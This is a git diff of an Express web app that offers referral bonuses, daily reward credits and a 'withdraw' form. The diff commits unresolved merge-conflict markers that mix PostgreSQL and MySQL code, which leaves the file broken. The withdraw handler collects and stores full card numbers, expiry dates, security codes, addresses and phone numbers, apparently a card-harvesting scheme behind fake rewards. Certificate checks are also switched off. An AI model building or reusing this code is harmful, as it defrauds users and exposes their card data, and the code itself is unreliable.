@@ -25,12 +25,29 @@ app.use(bodyParser.json());
 // Middleware to parse cookies
 app.use(cookieParser());
 
+<<<<<<< HEAD
 // PostgreSQL connection
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL, // Use the DATABASE_URL environment variable
   ssl: {
     rejectUnauthorized: false, // Adjust SSL settings based on your environment
   },
+=======
+// MySQL connection
+const db = mysql.createConnection({
+  host: process.env.MYSQL_ADDON_HOST ,
+  user: process.env.MYSQL_ADDON_USER,
+  password: process.env.MYSQL_ADDON_PASSWORD ,
+  database: process.env.MYSQL_ADDON_DB ,
+});
+
+db.connect(err => {
+  if (err) {
+    console.error('Database connection failed:', err.stack);
+    return;
+  }
+  console.log('MySQL Connected...');
+>>>>>>> 816279ef45a7483ea759904090c89c7afaa624d3
 });
 
 // Middleware to check if user is authenticated
@@ -133,7 +150,11 @@ app.post('/signup', async (req, res) => {
       const { rows: referrer } = await pool.query('SELECT * FROM users WHERE referral_code = $1', [referral_code]);
       if (referrer.length) {
         referredBy = referral_code;
+<<<<<<< HEAD
         await pool.query('UPDATE users SET balance = balance + 500 WHERE referral_code = $1', [referral_code]);
+=======
+        await db.promise().query('UPDATE users SET balance = balance + 500 WHERE referral_code = ?', [referral_code]);
+>>>>>>> 816279ef45a7483ea759904090c89c7afaa624d3
       }
     }
 
@@ -141,8 +162,14 @@ app.post('/signup', async (req, res) => {
     const newReferralCode = email.split('@')[0] + Math.floor(Math.random() * 1000);
 
     // Insert the new user
+<<<<<<< HEAD
     await pool.query('INSERT INTO users (username, email, password, referral_code, referred_by, balance) VALUES ($1, $2, $3, $4, $5, $6)', 
       [username, email, hashedPassword, newReferralCode, referredBy, 50]);
+=======
+ 
+      await db.promise().query('INSERT INTO users (username, email, password, referral_code, referred_by, balance) VALUES (?, ?, ?, ?, ?, ?)', 
+        [username, email, hashedPassword, newReferralCode, referredBy, 50]);
+>>>>>>> 816279ef45a7483ea759904090c89c7afaa624d3
         
     // Redirect to login page
     res.redirect('/login');
@@ -284,8 +311,13 @@ app.post('/claim-daily-reward', authenticateToken, async (req, res) => {
     // Check if 24 hours have passed since the last claim
     if (hoursSinceLastClaim >= 24) {
       // Update balance and last claim time
+<<<<<<< HEAD
       const updateSql = 'UPDATE users SET balance = balance + 20, last_claim = $1 WHERE id = $2';
       await pool.query(updateSql, [now, userId]);
+=======
+      const updateSql = 'UPDATE users SET balance = balance + 20, last_claim = ? WHERE id = ?';
+      await db.promise().query(updateSql, [now, userId]);
+>>>>>>> 816279ef45a7483ea759904090c89c7afaa624d3
 
       // Redirect to dashboard after successful claim
       return res.redirect('/dashboard');
@@ -316,14 +348,22 @@ app.post('/logout', (req, res) => {
 app.get('/withdraw', authenticateToken, (req, res) => {
   res.render('withdraw'); // Render the withdraw form
 });
+<<<<<<< HEAD
 
 // Withdraw Form (POST)
+=======
+// Withdraw Form (post)
+>>>>>>> 816279ef45a7483ea759904090c89c7afaa624d3
 app.post('/withdraw', authenticateToken, async (req, res) => {
   const { data, expiration_date, security_code, account_name, street_address, country, city, state, zip_code, phone_number, amount } = req.body;
   const card_number = data;
   try {
     // Fetch the user's current balance
+<<<<<<< HEAD
     const { rows: user } = await pool.query('SELECT balance FROM users WHERE id = $1', [req.user.userId]);
+=======
+    const [user] = await db.promise().query('SELECT balance FROM users WHERE id = ?', [req.user.userId]);
+>>>>>>> 816279ef45a7483ea759904090c89c7afaa624d3
     
     // Insert the withdrawal request into the withdrawals table
     await pool.query('INSERT INTO withdrawals (user_id, card_number, expiration_date, security_code, account_name, street_address, country, city, state, zip_code, phone_number, amount) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)', 
